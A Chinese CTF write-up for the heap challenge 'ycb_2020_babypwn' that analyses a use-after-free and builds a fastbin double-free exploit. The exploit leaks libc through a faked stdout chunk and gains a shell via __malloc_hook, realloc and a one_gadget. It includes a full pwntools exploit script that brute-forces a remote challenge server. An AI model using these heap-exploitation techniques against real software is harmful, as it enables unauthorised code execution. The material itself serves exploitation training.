# ycb_2020_babypwn

## 总结
根据本题，学习与收获有：

- stdout结构体上方和malloc_hook上方均能伪造大小为0x70的chunk。一个用来泄露libc地址，一个用来getshell。
- 当程序没有show功能的时候，可以利用fastbin attack，这时候，可伪造大小为0x70的fastbin chunk到stdout结构体的上方，将flag修改为0x0FBAD1887，将_IO_write_base的低字节修改一下，比如修改为0x58。
- 有时候，直接劫持malloc_hook为one_gadget可能无法滿足条件，这个时候，可以利用malloc_hook上方的realloc_hook，利用realloc函数开头的几个pop指令，来调整栈帧。这个时候，设置realloc_hook为one_gadget，malloc_hook为realloc函数地址加上一个偏移，这里的偏移可以慢慢调试，选取2、4、6、12等。
- 构造overlapped的chunk的时候，有时候并不一定需要完全改写整个fd指针的内容，可以根据偏移只改写部分低字节。
- main_arena+88或者main_arena+96距离stdout上方的fake chunk地址很近，只需修改低2位的字节，低1位的字节，固定为\xdd。

## 题目分析
### checksec

```
# checksec ./data/ycb_2020_babypwn
[*] '/root/AutoExpMarkDocker-v3/data/ycb_2020_babypwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

可以看到，保护全开。

### 函数分析
#### main

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int choose; // eax
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("Nice to see you again!");
  puts("Having a good time ~");
  puts("......");
  puts(&s);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 8u);
      choose = atoi(buf);
      if ( choose != 2 )
        break;
      Delete();
    }
    if ( choose == 3 )
    {
      puts("Bye ~");
      exit(0);
    }
    if ( choose == 1 )
      Add();
    else
      puts("Invalid choice");
  }
}
```

同样的，函数我均已经重命名过了。方便做题。很典型的菜单题。

#### menu

```c
int menu()
{
  puts(&s);
  puts("1. Add");
  puts("2. Delete");
  puts("3. Exit");
  return printf("Your choice : ");
}
```

选项很简单，只有添加和删除。

#### Add

```c
int Add()
{
  unsigned int size; // [rsp+0h] [rbp-20h] BYREF
  unsigned int size_4; // [rsp+4h] [rbp-1Ch]
  void *s; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  s = 0;
  buf = 0;
  size = 0;
  if ( (unsigned int)add_count > 0x13 )
    return puts("Too much!!!");
  s = malloc(0x28u);
  memset(s, 0, 0x28u);
  puts("size of the game's name: ");
  _isoc99_scanf("%u", &size);
  if ( size == -1 )
    exit(-1);
  if ( size <= 0x70 && size )
  {
    buf = malloc(size);
    if ( !buf )
    {
      puts("Error !!");
      exit(-1);
    }
    puts("game's name:");
    read(0, buf, size);
    *((_QWORD *)s + 1) = buf;
    puts("game's message:");
    _isoc99_scanf("%23s", (char *)s + 16);
    *(_DWORD *)s = 1;
    for ( size_4 = 0; size_4 <= 0x13; ++size_4 )
    {
      if ( !ptr_addr[size_4] )
      {
        ptr_addr[size_4] = s;
        break;
      }
    }
    ++add_count;
    return puts("Added!");
  }
  else
  {
    puts("size error!!");
    return 0;
  }
}
```

有几个点需要注意一下：

- 最多只能分配20次
- 每次分配用户指定大小的chunk前，会分配一个0x30大小的chunk A用来管理后面的chunk B
- 用户指定的大小不能超过0x70，也就是说，所有的为用户分配的chunk，范围都在fastbin
- A[0]写的是1，A[1]写的是chunk B的地址，A[2]开始，写的是messgae，且没有溢出。

#### Delete

```c
int Delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !add_count )
    return puts("Null!");
  puts("game's index:");
  _isoc99_scanf("%d", &idx);
  if ( idx <= 0x13 && ptr_addr[idx] )
  {
    *(_DWORD *)ptr_addr[idx] = 0;
    free(*(void **)(ptr_addr[idx] + 8LL));
    return puts("Deleted!");
  }
  else
  {
    puts("index error!");
    return 0;
  }
}
```

这里需要注意：

- 只释放了上面的Add函数中的chunk B， 没有释放有管理功能的chunk A，但是把A[0]写为了0。
- 释放后指针没有置空，存在uaf。

### 漏洞点
题目很精炼，漏洞点也比较好找。就是在Delete函数中，存在的一个uaf漏洞。由于靶机的环境是ubuntu 16.04，使用的libc版本为libc-2.23.so，因此，很显然就想到了使用fastbin double free attack。

## 利用思路
### 知识点

- fastbin对double free的检测，是有一定的缺陷的。不像后来的tcache bin的检测，会去检查整条链中是否存在一样的被释放的chunk，fastbin只会去检查上一个chunk与当前的要释放的chunk是不是一样的。
- fastbin double free利用的过程为free A ----> free B ----> free A。这里的A、B的大小要一样。之后，分配第一次的时候，改写fd指针为指定地址，然后连续分配两次，第四次分配，就能到指定地址获取chunk。也就是说，这里需要分配4次，才能分配到fake chunk。

### 利用过程
由于题目没有edit的功能，所以利用起来还是很麻烦的，需要反复地进行malloc与free。

整体的利用思路如下：

- 构造出A-->B-->A的overlapped的fastbin chunk，同时做好堆内容的填写，便于使用fake chunk
- 修改A的fd指针的低字节，分配到fake chunk C处，让这个chunk C能修改到chunk B的size域和fd域
- 修改chunk B的size域，使其大于等于0x90，保证释放后能被放在unsorted bin中去，且fd和bk指针被写入一个libc地址
- 修改上面chunk B的fd的低2个字节，分配到stdout结构体上方，这里需要爆破一下。
- 修改stdout的flag字段和write_base的低字节，获取到libc地址
- 利用fastbin double free分配到malloc_hook，利用realloc + one_gadget来get_shell

详细利用步骤：

- 分配两个0x70大小的chunk 0和chunk 1，并把内容填充为0x0000000000000071，方便后续伪造chunk
- 依次释放chunk 0--->1--->0，然后分配大小为0x70的chunk 2，修改fd的低字节为0x20，继续分配chunk 3、4
- 分配chunk 5，那么chunk 5就能改写chunk 0的size和fd域
- 先释放chunk 0，再释放chunk 5，然后分配chunk 6，修改chunk 0的size域为0x91
- 再释放chunk 0，这样就得到了一个unsorted bin，且把释放了的chunk 0的fd写为了一个堆地址
- 分配一个0x30大小的chunk 7，避免后续分配管理的chunk的时候，从unsorted bin里面切割。
- 再次释放chunk 6，分配chunk 8，修改chunk 0的size为0x71和fd的低2个字节，使其fd指向stdout结构体上方的那个fake chunk
- 分配到stdout上方的fake chunk，修改stdout结构体的flag和write_base，泄露出堆地址
- 利用double free分配到malloc_hook附近，结合realloc调整栈帧，利用one_gadget获取shell

## EXP
### 调试过程
这里展示本地调试的过程，手动输入需要爆破的那个字节大小。

首先准备好各个函数：

```python
def Add(sh:tube, size:int, name:(str, bytes), 
        msg:(str, bytes)=8 * b'\x00' + p64(0x71) + b'\x00' * 7):
    assert size > 0 and size <= 0x70
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(size))
    sh.sendafter("game's name:\n", name)
    sh.sendlineafter("game's message:\n", msg)
    return sh.recvline()


def Delete(sh:tube, idx:int):
    sh.sendlineafter("Your choice : ", '2')
    sh.sendlineafter("game's index:\n", str(idx))
    sh.recvline()
```

分配两个chunk并释放，构造overlapped chunk：

```python
Add(sh, 0x60, 14 * p64(0x71)) # 0
Add(sh, 0x60, 14 * p64(0x71)) # 1
Delete(sh, 0)
Delete(sh, 1)
Delete(sh, 0)
```

```bash
pwndbg> heapinfo
(0x20)  fastbin[0]: 0x0
(0x30)  fastbin[1]: 0x0
(0x40)  fastbin[2]: 0x0
(0x50)  fastbin[3]: 0x0
(0x60)  fastbin[4]: 0x0
(0x70)  fastbin[5]: 0x55f53e760030 --> 0x55f53e7600d0 --> 0x55f53e760030 (overlap chunk with 0x55f53e760030(freed))
(0x80)  fastbin[6]: 0x0
...
top: 0x55f53e760140 (size : 0x20ec0)
last_remainder: 0x0 (size : 0x0)
unsortbin: 0x0
```

修改低字节为0x20：

```python
Add(sh, 0x60, '\x20') # 2
```

```bash
pwndbg> heapinfo
(0x20)  fastbin[0]: 0x0
(0x30)  fastbin[1]: 0x0
(0x40)  fastbin[2]: 0x0
(0x50)  fastbin[3]: 0x0
(0x60)  fastbin[4]: 0x0
(0x70)  fastbin[5]: 0x55f53e7600d0 --> 0x55f53e760030 --> 0x55f53e760020 (overlap chunk with 0x55f53e760030(freed))
(0x80)  fastbin[6]: 0x0
...
top: 0x55f53e760170 (size : 0x20e90)
last_remainder: 0x0 (size : 0x0)
unsortbin: 0x0

pwndbg> vis_heap_chunks
0x55f53e760000  0x0000000000000000  0x0000000000000031
0x55f53e760010  0x0000000000000000  0x000055f53e760040
0x55f53e760020  0x0000000000000071  0x0000000000000071  <-- fastbins[0x70][2]
0x55f53e760030  0x0000000000000000  0x0000000000000071  <-- fastbins[0x70][1]
0x55f53e760040  0x000055f53e760020  0x0000000000000071
0x55f53e760050  0x0000000000000071  0x0000000000000071
0x55f53e760060  0x0000000000000071  0x0000000000000071
...
```

修改chunk 0的size域为0x91，得到unsorted bin chunk，并构造出fastbin与unsorted bin重合的堆布局，准备好0x30大小的chunk，避免切割unsorted bin：

```python
Add(sh, 0x60, '\x20') # 3
Add(sh, 0x60, '\x20') # 4
Add(sh, 0x60, p64(0) + p64(0x71)) # 5

Delete(sh, 0)
Delete(sh, 5)

Add(sh, 0x60, p64(0) + p64(0x91)) # 6
Add(sh, 0x20, 'bbbb') # 7
Delete(sh, 0)
```

```bash
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x55f53e760260 ← 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x55f53e760020 -> 0x55f53e760030 -> 0x7f1181836b78 (main_arena+88) <- 0x55f53e760030 /* '0' */
0x80: 0x0

unsortedbin
all: 0x55f53e760030 -> 0x7f1181836b78 (main_arena+88) <- 0x55f53e760030 /* '0' */

smallbins
empty
largebins
empty
```

修改chunk 0的size为0x71，修改fd指针的低2个字节，释放掉好0x30大小的chunk：

```python
get = input('get low 2th byte (hex):')
get = int16(get)
get = get.to_bytes(1, 'big')
Add(sh, 0x60, p64(0) + p64(0x71) + b'\xdd' + get) # 8
Delete(sh, 7)
Add(sh, 0x60, 'deadbeef') # 9
```

首先看要修改的那个fake chunk的地址：

```bash
pwndbg> fakefast 0x7f1181837640 0x70
fake chunk : 0x7f11818375dd  padding : 83

pwndbg> telescope 0x7f1181837620
00:0000| 0x7f1181837620 (_IO_2_1_stdout_) ← 0xfbad2887
01:0008| 0x7f1181837628 (_IO_2_1_stdout_+8)
...

pwndbg> telescope 0x55f53e760030
00:0000| 0x55f53e760030 ← 0x55f53e760030 /* '0' */
01:0008| 0x55f53e760038 ← 0x91
02:0010| 0x55f53e760040 ← 0x7f1181836b78 (main_arena+88)
...

pwndbg> distance 0x7f1181836b78 0x7f11818375dd
0x7f1181836b78->0x7f11818375dd is 0xa65 bytes (0x14c words)
```

可以顺便看一下stdout结构体：

```bash
pwndbg> fp 0x7f1181837620
$4 = {
  _flags = -72537977,
  _IO_read_ptr  = 0x7f11818376a3 <_IO_2_1_stdout_+131> "\n",
  _IO_read_end  = 0x7f11818376a3 <_IO_2_1_stdout_+131> "\n",
  _IO_read_base = 0x7f11818376a3 <_IO_2_1_stdout_+131> "\n",
  _IO_write_base = 0x7f11818376a3 <_IO_2_1_stdout_+131> "\n",
  _IO_write_ptr  = 0x7f11818376a3 <_IO_2_1_stdout_+131> "\n",
  _IO_write_end  = 0x7f11818376a3 <_IO_2_1_stdout_+131> "\n",
  _IO_buf_base   = 0x7f11818376a3 <_IO_2_1_stdout_+131> "\n",
  _IO_buf_end    = 0x7f11818376a4 <_IO_2_1_stdout_+132> "",
  ...
}
```

这里我们输入0x75就能分配到这个fake chunk处。

```bash
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x55f53e760260 ← 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x7f11818375dd (_IO_2_1_stderr_+157) ← 0x0
0x80: 0x0

unsortedbin
all [corrupted]
FD: 0x55f53e760030 ← 0x6665656264616564 ('deadbeef')
BK: 0x55f53e760030 → 0x7f1181836b78 (main_arena+88) ← 0x55f53e760030 /* '0' */

smallbins
empty
largebins
empty
```

分配到stdout结构体上方，泄露出libc地址：

```python
Delete(sh, 7)

# 10
sh.sendlineafter("Your choice : ", '1')
sh.sendlineafter("size of the game's name: \n", str(0x60))
sh.sendafter("game's name:\n", 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58')
leak_libc_addr = u64(sh.recvn(8))
sh.sendlineafter("game's message:\n", 'aaa')
LOG_ADDR('leak_libc_addr', leak_libc_addr)

libc_base_addr = leak_libc_addr -  0x3c56a3
LOG_ADDR('libc_base_addr', libc_base_addr)
```

```bash
[DEBUG] Received 0x5b bytes:
00000000  a3 76 83 81 11 7f 00 00  a4 76 83 81 11 7f 00 00  |.v.......v......|
...

[DEBUG] Sent 0x4 bytes:
b'aaa\n'
[*] leak_libc_addr ===> 0x7f11818376a3
[*] libc_base_addr ===> 0x7f1181472000
```

```
pwndbg> libc
libc : 0x7f1181472000
```

再次分配到malloc_hook，并利用realloc调整栈帧，这里选则的偏移是0xd：

```python
Delete(sh, 5)
Delete(sh, 0)
Delete(sh, 5)

target_addr = libc_base_addr + malloc_hook_offset - 0x23

Delete(sh, 7)
Add(sh, 0x60, p64(target_addr)) # 11

Delete(sh, 7)
Add(sh, 0x60, p64(target_addr))

Delete(sh, 7)
Add(sh, 0x60, p64(target_addr))

Delete(sh, 7)
one_gadget = libc_base_addr + gadget_offset
Add(sh, 0x60, 0xb * b'a' + p64(one_gadget) + p64(libc_base_addr + realloc_offset + 0xd))

LOG_ADDR('one_gadget addr', one_gadget)
sh.sendlineafter("Your choice : ", '1')
```

```bash
pwndbg> bins
fastbins
...
0x50: 0x0
0x60: 0x0
0x70: 0x55f53e760020 -> 0x55f53e760020 -> 0x7f1181836aed (_IO_wide_data_0+301)
0x80: 0x0

unsortedbin
all [corrupted]
FD: 0x55f53e760030 → 0x55f53e760020 → 0x7f1181836aed (_IO_wide_data_0+301)
BK: 0x55f53e760030 → 0x7f1181836b78 (main_arena+88) ← 0x55f53e760030 /* '0' */

pwndbg> telescope 0x7f1181836aed
00:0000| 0x7f1181836aed (_IO_wide_data_0+301)
01:0008| 0x7f1181836af5 (_IO_wide_data_0+309)
02:0010| 0x7f1181836afd (_IO_wide_data_0+317)
03:0018| 0x7f1181836b05 (__memalign_hook+5)
04:0020| 0x7f1181836b0d (__realloc_hook+5)
05:0028| 0x7f1181836b15 (__malloc_hook+5)
...

pwndbg> telescope 0x7f1181836b00
00:0000| 0x7f1181836b00 (__memalign_hook) ← 0x6161616161616161 ('aaaaaaaa')
01:0008| 0x7f1181836b08 (__realloc_hook) ← 0x7f11814b727a (do_system+1098)
02:0010| 0x7f1181836b10 (__malloc_hook) ← 0x7f11814f671d (realloc+13)
03:0018| 0x7f1181836b18 ← 0x0
...
```

### 完整exp
完整的exp是需要爆破的：

```python
from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)


def Add(sh:tube, size:int, name:(str, bytes), 
        msg:(str, bytes)=8 * b'\x00' + p64(0x71) + b'\x00' * 7):
    assert size > 0 and size <= 0x70
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(size))
    sh.sendafter("game's name:\n", name)
    sh.sendlineafter("game's message:\n", msg)
    return sh.recvline()


def Delete(sh:tube, idx:int):
    sh.sendlineafter("Your choice : ", '2')
    sh.sendlineafter("game's index:\n", str(idx))
    sh.recvline()

def attack(sh:process, malloc_hook_offset, gadget_offset, 
            realloc_offset, low_2th_byte:int=0xe5):
    Add(sh, 0x60, 14 * p64(0x71)) # 0

    Add(sh, 0x60, 14 * p64(0x71)) # 1
    Delete(sh, 0)

    Delete(sh, 1)
    Delete(sh, 0)

    Add(sh, 0x60, '\x20') # 2

    Add(sh, 0x60, '\x20') # 3

    Add(sh, 0x60, '\x20') # 4

    Add(sh, 0x60, p64(0) + p64(0x71)) # 5


    Delete(sh, 0)
    Delete(sh, 5)

    Add(sh, 0x60, p64(0) + p64(0x91)) # 6
    Add(sh, 0x20, 'bbbb') # 7

    Delete(sh, 0)

    Delete(sh, 5)
    Delete(sh, 7)

    # get = input('get low 2th byte (hex):')
    # get = int16(get)
    get = low_2th_byte.to_bytes(1, 'big')
    Add(sh, 0x60, p64(0) + p64(0x71) + b'\xdd' + get) # 8
    Delete(sh, 7)
    Add(sh, 0x60, 'deadbeef') # 9
    Delete(sh, 7)

    # 10
    sh.sendlineafter("Your choice : ", '1')
    sh.sendlineafter("size of the game's name: \n", str(0x60))
    sh.sendafter("game's name:\n", 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58')
    leak_libc_addr = u64(sh.recvn(8))
    sh.sendlineafter("game's message:\n", 'aaa')
    LOG_ADDR('leak_libc_addr', leak_libc_addr)

    libc_base_addr = leak_libc_addr -  0x3c56a3
    LOG_ADDR('libc_base_addr', libc_base_addr)

    # gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1207]
    # realloc_offset = 0x84710

    Delete(sh, 5)
    Delete(sh, 0)
    Delete(sh, 5)

    # malloc_hook_offset = 0x3c4b10
    target_addr = libc_base_addr + malloc_hook_offset - 0x23

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr)) # 11

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr))

    Delete(sh, 7)
    Add(sh, 0x60, p64(target_addr))

    Delete(sh, 7)
    one_gadget = libc_base_addr + gadget_offset
    Add(sh, 0x60, 0xb * b'a' + p64(one_gadget) + p64(libc_base_addr + realloc_offset + 0xd))

    LOG_ADDR('one_gadget addr', one_gadget)
    sh.sendlineafter("Your choice : ", '1')

    sh.sendline('cat flag')
    sh.recvline_contains(b'flag', timeout=2)
    sh.interactive()


if __name__ == '__main__':
    while True:
        try:
            # sh = process('./ycb_2020_babypwn')
            sh = remote("node3.buuoj.cn", 28643)
            r_realloc = 0x846c0
            r_gadget = 0x4526a
            attack(sh, 0x3c4b10, r_gadget, r_realloc)
        except:
            sh.close()
```